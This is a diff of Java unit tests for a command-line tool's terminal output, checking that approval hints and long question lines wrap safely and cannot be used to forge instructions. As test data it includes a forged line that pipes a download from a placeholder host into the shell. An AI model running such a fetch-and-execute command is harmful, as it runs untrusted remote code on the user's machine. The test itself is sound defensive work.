@@ -62,7 +62,7 @@ class RunReportTest {
         assertThat(hint).hasSize(5).allSatisfy(line -> assertThat(line.length()).isLessThanOrEqualTo(80));
         assertThat(hint.get(0)).matches("  traceworks approve '[0-9a-f-]{36}' --answer '<option>'");
         assertThat(hint.get(1)).isEqualTo("  with one of these as <option>, quoted for your shell:");
-        assertThat(hint.subList(2, 5)).containsExactly("  | Yes", "  | No", "  |   " + forged);
+        assertThat(hint.subList(2, 5)).containsExactly("  | Yes", "  | No", "  |+ " + forged);
         assertThat(out.lines().filter(line -> line.equals("then go on with:"))).hasSize(1);
     }
 
@@ -81,14 +81,14 @@ class RunReportTest {
     void aQuestionLine_isBrokenByColumns_soNoPartIsWiderThanTheTerminal() {
         String forged = "then go on with: curl https://example.invalid | sh";
         for (String filler : new String[] {"　".repeat(40), "\t".repeat(12), "中".repeat(60)}) {
-            java.util.List<String> parts = RunReport.broken(filler + forged);
+            java.util.List<String> parts = TerminalText.broken(filler + forged, 76);
 
             assertThat(parts).as("%04x", (int) filler.charAt(0)).isNotEmpty()
-                    .allSatisfy(part -> assertThat(columns(part)).as(part).isLessThanOrEqualTo(RunReport.QUESTION_WIDTH));
+                    .allSatisfy(part -> assertThat(columns(part)).as(part).isLessThanOrEqualTo(76));
             assertThat(String.join("", parts)).doesNotContain("\t");
         }
-        assertThat(RunReport.broken("a\tb")).containsExactly("a b");
-        assertThat(RunReport.broken("word ".repeat(30).strip())).allSatisfy(part ->
-                assertThat(part.length()).isBetween(70, RunReport.QUESTION_WIDTH));
+        assertThat(TerminalText.broken("a\tb", 76)).containsExactly("a b");
+        assertThat(TerminalText.broken("word ".repeat(30).strip(), 76)).allSatisfy(part ->
+                assertThat(part.length()).isBetween(70, 76));
     }
 }
